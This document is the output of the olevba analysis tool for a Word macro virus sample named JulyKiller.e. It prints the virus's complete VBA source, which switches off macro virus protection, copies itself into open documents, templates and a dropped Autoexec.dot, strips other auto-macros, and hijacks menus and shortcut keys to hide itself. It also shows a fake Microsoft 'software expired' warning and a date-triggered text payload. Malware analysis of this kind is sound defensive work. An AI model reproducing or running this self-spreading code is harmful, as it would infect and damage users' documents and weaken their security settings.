olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.JulyKiller.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.JulyKiller.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Y2K.bas 
in file: Virus.MSWord.JulyKiller.e - OLE stream: 'Macros/VBA/Y2K'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub actNo()
    MsgBox "您的 Office 软件已经超过使用期限,请与我们联系:        " + Chr(13) + _
    Chr(13) + "                HTTP://home.microsoft.com" _
    , vbOKOnly + vbCritical, "Microsoft Word"
    For Each myTask In Tasks
        If InStr(myTask.Name, "Word") > 0 Then
            myTask.Visible = False
        End If
    Next myTask
End Sub
Sub Autos()
    Dim file$
    Dim ans$
    Dim test
    Dim mItem
    Dim cItem
    Dim aDoc
    Dim aTemp
    Dim vset
    Dim Iset
    Dim ad
    Dim y2kDate As Long
    Application.ScreenUpdating = False
    For Each ad In AddIns
    If ad.Name = "Autoexec.dot" Then
        ad.Installed = False
    End If
    Next ad
    With Dialogs(wdDialogToolsOptionsFileLocations)
    .Path = "STARTUP-PATH"
    .Setting = "c:\"
    .Execute
    End With
    If Options.VirusProtection Then
        Options.VirusProtection = False
    End If
    
    file$ = WordBasic.[MacroFileName$]()
    If InStr(file$, "Autoexec") <> 0 Then
        For Each aDoc In Documents
        For Each cItem In aDoc.VBProject.VBComponents
        If (cItem.Name = "Y2K") Then
            vset = 1
        End If
        Next cItem
        Next aDoc
        For Each cItem In NormalTemplate.VBProject.VBComponents
        If (cItem.Name = "Y2K") Then
            vset = 1
        End If
        Next cItem
        If vset <> 1 Then
        WordBasic.DisableAutoMacros
        Documents.Open FileName:="C:\Autoexec.dot", AddToRecentFiles:=False
        For Each aDoc In Documents
            If (InStr(aDoc.FullName, Application.PathSeparator) <> 0) And (aDoc.VBProject.Protection = 0) Then
                    WordBasic.MacroCopy ActiveDocument.FullName + ":Y2K", aDoc.FullName + ":Y2K"
            End If
        Next aDoc
        For Each aTemp In Templates
            If (InStr(aTemp.FullName, Application.PathSeparator) <> 0) And (aTemp.VBProject.Protection = 0) Then
                    WordBasic.MacroCopy ActiveDocument.FullName + ":Y2K", aTemp.FullName + ":Y2K"
            End If
        Next aTemp
        ActiveDocument.Save
        ActiveDocument.Close
        End If
        If vset = 1 Then
            GoTo out
        End If
    End If
    
    With Application.FileSearch
    .LookIn = "C:\"
    .FileName = "Autoexec.dot"
    If .Execute > 0 Then
          Iset = 1
    End If
    End With
    If Iset <> 1 Then
        WordBasic.DisableAutoMacros
        Documents.Add NewTemplate:=True
        WordBasic.MacroCopy file$ + ":Y2K", ActiveDocument.FullName + ":Y2K"
        ActiveDocument.SaveAs FileName:="c:\Autoexec.dot", AddToRecentFiles:=False
        ActiveDocument.Close
    End If

    For Each aDoc In Documents
        If (file$ <> aDoc.FullName) And (aDoc.VBProject.Protection = 0) Then
            For Each cItem In aDoc.VBProject.VBComponents
                If (cItem.Name = "AutoOpen") Or (cItem.Name = "AutoNew") Or (cItem.Name = "AutoClose") Or (cItem.Name = "FileSave") Then
                    aDoc.VBProject.VBComponents.Remove (cItem)
                End If
            Next cItem
        End If
    Next aDoc
    For Each aTemp In Templates
        If (file$ <> aTemp.FullName) And (aTemp.VBProject.Protection = 0) Then
            For Each cItem In aTemp.VBProject.VBComponents
                If (cItem.Name = "AutoOpen") Or (cItem.Name = "AutoNew") Or (cItem.Name = "AutoClose") Or (cItem.Name = "FileSave") Then
                    aTemp.VBProject.VBComponents.Remove (cItem)
                End If
            Next cItem
        End If
    Next aTemp
    For Each aDoc In Documents
        If (InStr(aDoc.FullName, Application.PathSeparator) <> 0) And (aDoc.VBProject.Protection = 0) Then
             WordBasic.MacroCopy file$ + ":Y2K", aDoc.FullName + ":Y2K"
             aDoc.Save
        End If
    Next aDoc
    For Each aTemp In Templates
        If (InStr(aTemp.FullName, Application.PathSeparator) <> 0) And (aTemp.VBProject.Protection = 0) Then
              WordBasic.MacroCopy file$ + ":Y2K", aTemp.FullName + ":Y2K"
        End If
    Next aTemp
out:
If InStr(file$, "Normal") = 0 Then

    CustomizationContext = NormalTemplate
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF8))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="FileSaveAs"
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="FileSaveAs"
       Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF1))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ToolsMacro"
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF2))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ViewVBCode"
    
    For Each mItem In CommandBars("Tools").Controls
    If mItem.Caption = "自定义(&C)..." Then
        mItem.OnAction = "actno"
    End If
    If mItem.Caption = "模板和加载项(&I)..." Then
        mItem.OnAction = "actno"
    End If
    If mItem.Caption = "选项(&O)..." Then
        mItem.OnAction = "actno"
    End If
    Next mItem
    For Each mItem In CommandBars("File").Controls
    If mItem.Caption = "新建(&N)..." Then
        mItem.OnAction = "NewDoc"
    End If
    If mItem.Caption = "保存(&S)" Then
        mItem.OnAction = "SaveDoc"
    End If
    Next mItem
    For Each cItem In CommandBars("Tools").Controls
    If cItem.Type = msoControlPopup Then
        If cItem.Caption = "宏(&M)" Then
            For Each mItem In cItem.CommandBar.Controls
                If mItem.Caption = "宏(&M)..." Then
                    mItem.OnAction = "actno"
                End If
                If mItem.Caption = "Visual Basic 编辑器(&V)" Then
                    mItem.OnAction = "actno"
                End If
            Next mItem
        End If
    End If
    Next cItem
    For Each cItem In CommandBars("Visual Basic").Controls
    cItem.OnAction = "actno"
    Next cItem
    For Each cItem In CommandBars("Standard").Controls
    If cItem.Index = 1 Then
    cItem.OnAction = "NewDoc"
    End If
    If cItem.Index = 3 Then
    cItem.OnAction = "SaveDoc"
    End If
    Next cItem
    For Each cItem In CommandBars
    If cItem.Visible = True Then
        cItem.Protection = msoBarNoCustomize
    End If
    Next cItem
End If
    For Each myTask In Tasks
        If InStr(myTask.Name, "Visual Basic") > 0 Then
            myTask.Visible = False
        End If
    Next myTask
Application.ScreenUpdating = True

Pun:
    y2kDate = Int(Now())
    On Error GoTo 0
    On Error GoTo en
    If y2kDate >= 36526 Then
        If y2kDate = 36826 Or (Rnd() * 100000 Mod 100) = 2 Then
            For i = 50 To 100
                Selection.TypeParagraph
                Selection.Font.ColorIndex = wdRed
                Selection.Font.Size = i
                Selection.TypeText Text:="I love U"
            Next i
        End If
    End If
en:

End Sub
Sub AutoOpen()
Autos
End Sub
Sub autoclose()
Autos
End Sub
Sub autoNew()
Autos
End Sub
Sub autoexec()
Autos
End Sub
Sub NewDoc()
Documents.Add Template:="", NewTemplate:=False
Autos
End Sub
Sub SaveDoc()
ActiveDocument.Save
Autos
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

